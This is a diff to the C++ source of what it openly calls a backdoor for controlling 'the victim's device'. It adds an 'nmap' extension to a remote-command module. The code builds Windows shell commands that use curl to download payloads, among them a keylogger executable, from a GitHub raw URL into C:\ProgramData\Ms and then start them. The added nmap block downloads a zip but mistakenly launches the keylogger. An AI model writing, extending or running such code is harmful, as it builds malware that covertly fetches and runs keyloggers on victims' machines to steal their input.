@@ -256,7 +256,7 @@ string CE_InfoExt(string buffer)
     }
     else
     {
-        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable extensions :\n--> keylog\n--> fill_storage\n--> network";
+        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable extensions :\n--> keylog\n--> fill_storage\n--> networks_profile\n--> nmap";
     }
 
     return ebuf;
@@ -271,6 +271,11 @@ string CE_RunExt(string buffer)
     if (ebuf.find("keylog") != string::npos)
     {
         command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
+        ebuf = command;
+    }
+    if (ebuf.find("nmap") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
         ebuf = command;
     }
     else if (ebuf.find("fill_storage") != string::npos)
@@ -317,6 +322,7 @@ string CE_StartupExt(string buffer)
 
     return ebuf;
 }
+// powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'
 
 string CE_StopExt(string buffer)
 {
